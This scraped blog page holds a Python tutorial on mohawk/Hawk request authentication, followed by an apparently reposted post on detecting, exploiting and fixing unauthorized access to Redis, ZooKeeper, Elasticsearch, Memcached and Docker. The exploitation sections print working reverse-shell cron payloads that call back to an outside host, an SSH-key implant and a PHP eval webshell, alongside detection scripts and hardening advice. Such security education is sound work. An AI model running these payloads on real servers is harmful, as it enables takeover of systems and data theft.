<p>因为之前研究过mohawk模块2个小时（真的是2个小时），因此本文主要介绍一下mohawk的用法。企业内部一般自己设计api的加密认证方案（一般是生成一个token密文，严格一点的会做双因子认证），因此这个模块适合给初学者练练手，也可以给打算自己设计认证方案的朋友提供一种思路。以下内容是我阅读mohawk文档总结的一些基础用法，更详细的可以参考下官网文档。</p>
<h3 id="hawk介绍"><a href="#hawk介绍" class="headerlink" title="hawk介绍"></a><a href="#hawk介绍" title="hawk介绍"></a>hawk介绍</h3><p>hawk项目地址：<a href="https://github.com/hueniverse/hawk" target="_blank" rel="noopener">https://github.com/hueniverse/hawk</a><br>python实现：<a href="https://github.com/kumar303/mohawk" target="_blank" rel="noopener">https://github.com/kumar303/mohawk</a><br>官方文档：<a href="https://mohawk.readthedocs.io/en/latest/" target="_blank" rel="noopener">https://mohawk.readthedocs.io/en/latest/</a></p>
<h4 id="安装hawk"><a href="#安装hawk" class="headerlink" title="安装hawk"></a><a href="#安装hawk" title="安装hawk"></a>安装hawk</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install mohawk</div></pre></td></tr></table></figure>

<h3 id="构建一个webserver"><a href="#构建一个webserver" class="headerlink" title="构建一个webserver"></a><a href="#构建一个webserver" title="构建一个webserver"></a>构建一个webserver</h3><p>这里我使用python的falcon框架来构建一个api webserver，如果对falcon框架不熟悉，可以先阅读：<a href="https://thief.one/2017/11/27/1/" target="_blank" rel="noopener">https://thief.one/2017/11/27/1/</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line">import falcon</div><div class="line">from mohawk import Receiver <span class="comment"># 导入mohawk模块的Receiver方法</span></div><div class="line">from wsgiref import simple_server</div><div class="line"></div><div class="line"><span class="comment"># 认证字典,可以创建不同的用户，每个用户都可以用不同的密钥（key）</span></div><div class="line">allowed_senders=&#123;</div><div class="line"></div><div class="line">    <span class="string">“test”</span>:&#123;</div><div class="line"></div><div class="line">        <span class="string">‘id’</span>: <span class="string">‘test’</span>,</div><div class="line">        <span class="string">‘key’</span>: <span class="string">‘110’</span>,</div><div class="line">        <span class="string">‘algorithm’</span>: <span class="string">‘sha256’</span></div><div class="line"></div><div class="line">    &#125;, <span class="comment"># test 用户组</span></div><div class="line"></div><div class="line">    <span class="string">“nmask”</span>:&#123;</div><div class="line"></div><div class="line">        <span class="string">‘id’</span>: <span class="string">‘nmask’</span>,</div><div class="line">        <span class="string">‘key’</span>: <span class="string">‘112’</span>,</div><div class="line">        <span class="string">‘algorithm’</span>: <span class="string">‘sha256’</span></div><div class="line"></div><div class="line">    &#125;, <span class="comment"># nmask 用户组</span></div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">def lookup_credentials(sender_id):</div><div class="line">    <span class="string">‘’</span><span class="string">‘ 验证用户是否在允许的范围内 ‘</span><span class="string">‘’</span></div><div class="line">    <span class="keyword">if</span> sender_id <span class="keyword">in</span> allowed_senders:</div><div class="line">        <span class="built_in">return</span> allowed_senders[sender_id]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        raise LookupError(<span class="string">‘unknown sender’</span>)</div><div class="line"></div><div class="line"></div><div class="line">class Test(object):</div><div class="line">    def on_post(self, req, resp):</div><div class="line">    <span class="string">‘’</span><span class="string">‘ http post 方法 ‘</span><span class="string">‘’</span></div><div class="line">        try:</div><div class="line">            Receiver(</div><div class="line">                    lookup_credentials, </div><div class="line">                    req.headers.get(<span class="string">‘AUTHORIZATION’</span>), <span class="comment"># 请求时生成的密钥</span></div><div class="line">                    req.url,</div><div class="line">                    req.method,</div><div class="line">                    content= req.stream.read(),</div><div class="line">                    content_type=req.headers.get(<span class="string">‘CONTENT-TYPE’</span>)</div><div class="line">            )</div><div class="line">        except Exception,e:</div><div class="line">            <span class="string">‘’</span><span class="string">‘ 报错则说明认证失败 ‘</span><span class="string">‘’</span></div><div class="line">            <span class="built_in">print</span> e</div><div class="line">            resp.status = falcon.HTTP_403  <span class="comment"># This is the default status</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            resp.status = falcon.HTTP_200  <span class="comment"># This is the default status</span></div><div class="line">            resp.body = (<span class="string">‘Hello World!’</span>)</div><div class="line"></div><div class="line"></div><div class="line">    def on_get(self, req, resp):</div><div class="line">        <span class="string">‘’</span><span class="string">‘ http get 方法 ‘</span><span class="string">‘’</span></div><div class="line">        try:</div><div class="line">            Receiver(</div><div class="line">                    lookup_credentials,</div><div class="line">                    req.headers.get(<span class="string">‘AUTHORIZATION’</span>),</div><div class="line">                    req.url,</div><div class="line">                    req.method,</div><div class="line">                    content= req.stream.read(),</div><div class="line">                    content_type=req.headers.get(<span class="string">‘CONTENT-TYPE’</span>)</div><div class="line">            )</div><div class="line">        except Exception,e:</div><div class="line">            <span class="built_in">print</span> e</div><div class="line">            resp.status = falcon.HTTP_403  <span class="comment"># This is the default status</span></div><div class="line">            resp.body = (<span class="string">‘authorization fail!’</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            resp.status = falcon.HTTP_200  <span class="comment"># This is the default status</span></div><div class="line">            resp.body = (<span class="string">‘Hello World!’</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">app = falcon.API()</div><div class="line"><span class="built_in">test</span> = Test()</div><div class="line">app.add_route(<span class="string">‘/‘</span>, <span class="built_in">test</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> <strong>name</strong> == <span class="string">‘<strong>main</strong>‘</span>:</div><div class="line">    httpd = simple_server.make_server(<span class="string">‘127.0.0.1’</span>, 8000, app)</div><div class="line">    httpd.serve_forever()</div></pre></td></tr></table></figure>

<h3 id="构建一个http请求"><a href="#构建一个http请求" class="headerlink" title="构建一个http请求"></a><a href="#构建一个http请求" title="构建一个http请求"></a>构建一个http请求</h3><p>搭建好webserver以后，我们自然需要构建http请求，去验证请求是否经历了认证的过程，且认证的结果是否正确，这里使用requests包去构建。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">import json</div><div class="line">import requests</div><div class="line">from mohawk import Sender <span class="comment"># 导入mohawk模块的Sender方法</span></div><div class="line"></div><div class="line">url = <span class="string">“<a href="http://127.0.0.1:8000/&quot;" target="_blank" rel="noopener">http://127.0.0.1:8000/&quot;</a></span></div><div class="line">post_data = json.dumps(<span class="string">“”</span>) <span class="comment"># 如果是get请求，参数内容可以设置为””</span></div><div class="line">content_type = <span class="string">‘application/x-www-form-urlencoded’</span></div><div class="line"></div><div class="line"><span class="comment"># 用于认证的字典</span></div><div class="line">credentials = &#123;</div><div class="line"></div><div class="line">               <span class="string">‘id’</span>: <span class="string">‘test’</span>,</div><div class="line">               <span class="string">‘key’</span>: <span class="string">‘10’</span>,</div><div class="line">               <span class="string">‘algorithm’</span>: <span class="string">‘sha256’</span></div><div class="line">           &#125;</div><div class="line"></div><div class="line">sender = Sender(credentials,</div><div class="line">                url = url, <span class="comment"># 必填</span></div><div class="line">                method = <span class="string">‘POST’</span>, <span class="comment"># 必填 </span></div><div class="line">                content = post_data, <span class="comment"># 必填，如果是get请求，参数内容可以设置为””</span></div><div class="line">                content_type = content_type <span class="comment"># 必填</span></div><div class="line">            )</div><div class="line"></div><div class="line"><span class="built_in">print</span> sender.request_header <span class="comment"># 生成的密文，通过header的形式传递到服务端</span></div><div class="line"></div><div class="line">res=requests.post(</div><div class="line">                url = url,</div><div class="line">                data = post_data,</div><div class="line">                headers=&#123;</div><div class="line">                        <span class="string">‘Authorization’</span>: sender.request_header,</div><div class="line">                        <span class="string">‘Content-Type’</span>: content_type</div><div class="line">                        &#125;</div><div class="line">                )</div><div class="line"></div><div class="line"><span class="built_in">print</span> res.status_code</div><div class="line"><span class="built_in">print</span> res.text</div></pre></td></tr></table></figure>

<h3 id="mohawk模块说明"><a href="#mohawk模块说明" class="headerlink" title="mohawk模块说明"></a><a href="#mohawk模块说明" title="mohawk模块说明"></a>mohawk模块说明</h3><p>mohawk是hawk的python实现，有几个主要方法：Sender、Receiver等，详细的可以去阅读源码。</p>
<p>Sender方法用来生成在http请求认证中所需的密码，该方法需要传递几个参数，比如：url、method、content（post_data）、content_type、credentials(认证的字典，包含了id、key、加密方式)等，该方法会根据传递的参数值，生成一个密文密码，然后我们可以将其放在headers中传递到服务端。</p>
<p>Receiver方法用来在服务端接收客户端传递的请求，根据获取的参数的内容计算出一个新的密文密码，与客户端传递的密文进行对比，达到认证的效果。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://chucz.club/2017/12/07/未授权访问漏洞的检测与利用/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chucz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="诗和田野">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/12/07/未授权访问漏洞的检测与利用/" itemprop="url">未授权访问漏洞的检测与利用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-08T03:21:52+08:00">
                2017-12-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>一杯敬故乡，一杯敬远方<br>　　最近在研究未授权访问漏洞的检测方式，也写了一部分检测脚本，准确率还挺高。当然光有检测还是不够的，最好能有漏洞利用过程，这样也好证明漏洞的风险性，便于推动漏洞修复也便于自己对漏洞更深入的了解。本文关于漏洞利用以及修复的内容绝大部分转载自：<a href="https://www.secpulse.com/archives/61101.html" target="_blank" rel="noopener">安全脉搏</a>，其实个人习惯是不喜欢全文照搬其他文章的，但无奈这篇文章总结的很好，我又没很多时间去整理，因此对其改动的不多，请读者务必谅解。<br><a id="more"></a></p>
</blockquote>
<h3 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a><a href="#redis未授权访问漏洞" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><a href="#漏洞描述" title="漏洞描述"></a>漏洞描述</h4><p>redis安装完以后，默认是没有账号密码的（安装redis详细可参考：<a href="https://thief.one/2017/11/15/1/）" target="_blank" rel="noopener">redis相关笔记</a>，如果redis是以root权限去运行，则可以被反弹shell或者写入ssh密钥，从而被获取服务器的权限。</p>
<h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a><a href="#漏洞检测" title="漏洞检测"></a>漏洞检测</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s.connect((host,port))</div><div class="line">s.send(<span class="string">“INFO\r\n”</span>)</div><div class="line">result = s.recv(1024)</div><div class="line"></div><div class="line"><span class="keyword">if</span> <span class="string">“redis_version”</span> <span class="keyword">in</span> result:</div><div class="line">    <span class="built_in">print</span> <span class="string">“exist vul”</span></div></pre></td></tr></table></figure>

<p>客户端连接测试一下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$redis</span>-cli -h host -p port</div><div class="line">&gt;CONFIG get requirepass</div><div class="line">1) <span class="string">“requirepass”</span></div><div class="line">2) <span class="string">“”</span></div><div class="line">说明：表示没有设置密码，默认为没有密码。</div></pre></td></tr></table></figure>

<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><a href="#漏洞利用" title="漏洞利用"></a>漏洞利用</h4><h5 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a><a href="#利用crontab反弹shell" title="利用crontab反弹shell"></a>利用crontab反弹shell</h5><p>自己服务器上监听一个端口(10.0.0.2)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvnp 4444</div></pre></td></tr></table></figure>

<p>执行命令:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 10.0.0.1</div><div class="line"><span class="built_in">set</span> x <span class="string">“\n<em> </em> <em> </em> * bash -i &gt;&amp; /dev/tcp/10.0.0.2/4444 0&gt;&amp;1\n”</span></div><div class="line">config <span class="built_in">set</span> dir /var/spool/cron/</div><div class="line">config <span class="built_in">set</span> dbfilename root</div><div class="line">save</div></pre></td></tr></table></figure>

<h5 id="写ssh-keygen公钥登录服务器"><a href="#写ssh-keygen公钥登录服务器" class="headerlink" title="写ssh-keygen公钥登录服务器"></a><a href="#写ssh-keygen公钥登录服务器" title="写ssh-keygen公钥登录服务器"></a>写ssh-keygen公钥登录服务器</h5><p>利用条件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.redis对外开放，且未授权访问（默认配置）</div><div class="line">2.服务器的ssh对外开放，可通过key登录</div></pre></td></tr></table></figure>

<p>详细攻击方式如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">准备好自己的公钥，写入本地文件text.txt。</div><div class="line">$ (<span class="built_in">echo</span> -e <span class="string">“\n\n”</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">“\n\n”</span>) &gt; test.txt</div><div class="line"></div><div class="line">2. 通过redis将该文件写入内存</div><div class="line">$ redis-cli -h 10.0.0.1 flushall</div><div class="line">$ cat test.txt | redis-cli -h 10.0.0.1 -x <span class="built_in">set</span> crackit</div><div class="line"></div><div class="line">3. 利用redis-cli 写入配置的方式将公钥写入到.ssh目录下</div><div class="line">$ redis-cli -h 10.0.0.1</div><div class="line">10.0.0.1:6379&gt; config <span class="built_in">set</span> dir /Users/nmask/.ssh/</div><div class="line">OK</div><div class="line">10.0.0.1:6379&gt; config get dir</div><div class="line">1) <span class="string">“dir”</span></div><div class="line">2) <span class="string">“/Users/nmask/.ssh”</span></div><div class="line">10.0.0.1:6379&gt; config <span class="built_in">set</span> dbfilename <span class="string">“authorized_keys”</span></div><div class="line">OK</div><div class="line">10.0.0.1:6379&gt; save</div><div class="line">OK</div></pre></td></tr></table></figure>

<h5 id="获取web服务的webshell"><a href="#获取web服务的webshell" class="headerlink" title="获取web服务的webshell"></a><a href="#获取web服务的webshell" title="获取web服务的webshell"></a>获取web服务的webshell</h5><p>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">config <span class="built_in">set</span> dir /var/www/html/</div><div class="line">config <span class="built_in">set</span> dbfilename shell.php</div><div class="line"><span class="built_in">set</span> x <span class="string">“&lt;?php @eval(<span class="variable">$_POST</span>[‘test’]);?&gt;”</span></div><div class="line">save</div></pre></td></tr></table></figure>

<p>说明：执行以上命令，即可将shell写入web目录。</p>
<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a><a href="#漏洞修复" title="漏洞修复"></a>漏洞修复</h4><p>到redis安装目录下，配置redis.conf文件：<br>1、默认只对本地开放<br>bind 127.0.0.1<br>2、添加登陆密码<br>requirepass <a href="http://www.secpulse.com" target="_blank" rel="noopener">www.secpulse.com</a><br>3、在需要对外开放的时候修改默认端口<br>port 2333<br>4、最后还可以配合iptables限制开放</p>
<h3 id="ZooKeeper未授权访问漏洞"><a href="#ZooKeeper未授权访问漏洞" class="headerlink" title="ZooKeeper未授权访问漏洞"></a><a href="#ZooKeeper未授权访问漏洞" title="ZooKeeper未授权访问漏洞"></a>ZooKeeper未授权访问漏洞</h3><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a><a href="#漏洞描述-1" title="漏洞描述"></a>漏洞描述</h4><p>安装zookeeper之后默认是没有账号密码的，即没有权限校验，可被远程利用，通过目标服务器收集敏感信息，或者破坏zookeeper集群。</p>
<h4 id="漏洞检测-1"><a href="#漏洞检测-1" class="headerlink" title="漏洞检测"></a><a href="#漏洞检测-1" title="漏洞检测"></a>漏洞检测</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s.connect((ip, port))</div><div class="line">s.send(<span class="string">“envi”</span>)</div><div class="line">result = s.recv(1024)</div><div class="line"><span class="keyword">if</span> <span class="string">“zookeeper.version”</span> <span class="keyword">in</span> result:</div><div class="line">    <span class="built_in">print</span> <span class="string">“exist vul”</span></div></pre></td></tr></table></figure>

<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a><a href="#漏洞利用-1" title="漏洞利用"></a>漏洞利用</h4><p>执行以下命令即可远程获取该服务器的环境：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> envi | nc ip port</div></pre></td></tr></table></figure>

<p>直接连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./zkCli.sh -server ip:port</div></pre></td></tr></table></figure>

<h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a><a href="#漏洞修复-1" title="漏洞修复"></a>漏洞修复</h4><p>1、禁止把Zookeeper直接暴露在公网<br>2、添加访问控制，根据情况选择对应方式（认证用户，用户名密码）<br>3、绑定指定IP访问</p>
<h3 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a><a href="#Elasticsearch未授权访问" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h3><h4 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a><a href="#漏洞描述-2" title="漏洞描述"></a>漏洞描述</h4><p>ELK是一款日志分析工具，默认监听9200端口，如果没有设置访问权限，可被非法操作数据。</p>
<h4 id="漏洞检测-2"><a href="#漏洞检测-2" class="headerlink" title="漏洞检测"></a><a href="#漏洞检测-2" title="漏洞检测"></a>漏洞检测</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">conn = httplib.HTTPConnection(ip, port, True, TIMEOUT)</div><div class="line">conn.request(<span class="string">“GET”</span>, <span class="string">‘/_cat/master’</span>)</div><div class="line">resp = conn.getresponse()</div><div class="line"><span class="keyword">if</span> resp.status == 200:</div><div class="line">    <span class="built_in">print</span> <span class="string">“exist vul”</span></div></pre></td></tr></table></figure>

<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a><a href="#漏洞利用-2" title="漏洞利用"></a>漏洞利用</h4><p>相当于一个API，任何人访问这个地址，就可以调用api，进行数据的增删改操作。<br><a href="http://x.x.x.x:9200/_nodes" target="_blank" rel="noopener">http://x.x.x.x:9200/_nodes</a><br><a href="http://x.x.x.x:9200/_river" target="_blank" rel="noopener">http://x.x.x.x:9200/_river</a></p>
<h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a><a href="#漏洞修复-2" title="漏洞修复"></a>漏洞修复</h4><p>1、防火墙上设置禁止外网访问9200端口。<br>2、使用Nginx搭建反向代理，通过配置Nginx实现对Elasticsearch的认证<br>3、限制IP访问，绑定固定IP<br>4、在config/elasticsearch.yml中为9200端口设置认证：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http.basic.enabled <span class="literal">true</span> <span class="comment">#开关，开启会接管全部HTTP连接</span></div><div class="line">http.basic.user <span class="string">“admin”</span> <span class="comment">#账号</span></div><div class="line">http.basic.password <span class="string">“admin_pw”</span> <span class="comment">#密码</span></div><div class="line">http.basic.ipwhitelist [<span class="string">“localhost”</span>, <span class="string">“127.0.0.1”</span>]</div></pre></td></tr></table></figure>

<h3 id="memcache未授权访问"><a href="#memcache未授权访问" class="headerlink" title="memcache未授权访问"></a><a href="#memcache未授权访问" title="memcache未授权访问"></a>memcache未授权访问</h3><h4 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a><a href="#漏洞描述-3" title="漏洞描述"></a>漏洞描述</h4><p>memcached是一套常用的key-value缓存系统，其本身并没有权限控制模块，因此攻击者通过命令交互可直接读取memcached中的敏感信息。</p>
<h4 id="漏洞检测-3"><a href="#漏洞检测-3" class="headerlink" title="漏洞检测"></a><a href="#漏洞检测-3" title="漏洞检测"></a>漏洞检测</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s.connect((ip, port))</div><div class="line">s.send(<span class="string">“stats”</span>)</div><div class="line">result = s.recv(1024)</div><div class="line"><span class="keyword">if</span> <span class="string">“STAT version”</span> <span class="keyword">in</span> result:</div><div class="line">    <span class="built_in">print</span> <span class="string">“exist vul”</span></div></pre></td></tr></table></figure>

<h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a><a href="#漏洞利用-3" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -vv &lt;target&gt; 11211</div></pre></td></tr></table></figure>

<p>说明：连接成功，则可获取memcached中的敏感信息。</p>
<h4 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a><a href="#漏洞修复-3" title="漏洞修复"></a>漏洞修复</h4><p>1、设置memchached只允许本地访问<br>2、禁止外网访问Memcached 11211端口<br>3、编译时加上–enable-sasl，启用SASL认证</p>
<h3 id="Docker未授权访问"><a href="#Docker未授权访问" class="headerlink" title="Docker未授权访问"></a><a href="#Docker未授权访问" title="Docker未授权访问"></a>Docker未授权访问</h3><h4 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a><a href="#漏洞描述-4" title="漏洞描述"></a>漏洞描述</h4><p>Docker Remote API是一个取代远程命令行界面（rcli）的REST API。通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。</p>
<h4 id="漏洞检测-4"><a href="#漏洞检测-4" class="headerlink" title="漏洞检测"></a><a href="#漏洞检测-4" title="漏洞检测"></a>漏洞检测</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">conn = httplib.HTTPConnection(ip, port, True, TIMEOUT)</div><div class="line">conn.request(<span class="string">“GET”</span>, <span class="string">‘/containers/json’</span>)</div><div class="line">resp = conn.getresponse()</div><div class="line"><span class="keyword">if</span> resp.status == 200 and <span class="string">“HostConfig”</span> <span class="keyword">in</span> resp.read():</div><div class="line">    <span class="built_in">print</span> <span class="string">“exist vul”</span></div></pre></td></tr></table></figure>

<h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a><a href="#漏洞利用-4" title="漏洞利用"></a>漏洞利用</h4><p>获取所有images</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><a href="http://host:2375/containers/json" target="_blank" rel="noopener">http://host:2375/containers/json</a></div></pre></td></tr></table></figure>

<p>getshell的方式与redis利用差不多。</p>
<h5 id="利用计划任务反弹shell"><a href="#利用计划任务反弹shell" class="headerlink" title="利用计划任务反弹shell"></a><a href="#利用计划任务反弹shell" title="利用计划任务反弹shell"></a>利用计划任务反弹shell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> -e <span class="string">“<em>/1 </em> <em> </em> * root /usr/bin/python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\”127.0.0.1\”,8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\”/bin/sh\”,\”-i\”]);’\n”</span> &gt;&gt; /etc/crontab</div></pre></td></tr></table></figure>

<h4 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a><a href="#漏洞修复-4" title="漏洞修复"></a>漏洞修复</h4><p>1、在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：<br>设置ACL，仅允许信任的来源IP连接；<br>设置TLS认证，官方的文档为Protect the Docker daemon socket<br>2、客户端连接时需要设置以下环境变量export DOCKER_TLS_VERIFY=1</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> DOCKER_CERT_PATH=~/.docker</div><div class="line"><span class="built_in">export</span> DOCKER_HOST=tcp://10.10.10.10:2375</div><div class="line"><span class="built_in">export</span> DOCKER_API_VERSION=1.12</div></pre></td></tr></table></figure>

<p>3、在 docker api 服务器前面加一个代理，例如 nginx，设置 401 认证</p>
<h3 id="wordpress未授权访问漏洞"><a href="#wordpress未授权访问漏洞" class="headerlink" title="wordpress未授权访问漏洞"></a><a href="#wordpress未授权访问漏洞" title="wordpress未授权访问漏洞"></a>wordpress未授权访问漏洞</h3><h4 id="漏洞描述-5"><a href="#漏洞描述-5" class="headerlink" title="漏洞描述"></a><a href="#漏洞描述-5" title="漏洞描述"></a>漏洞描述</h4><p>wordpress未经授权的攻击者利用该漏洞可注入恶意内容，以及进行提权，对文章、页面等内容进行修改。REST API是最近添加到WordPress 4.7.0并默认启用的。</p>
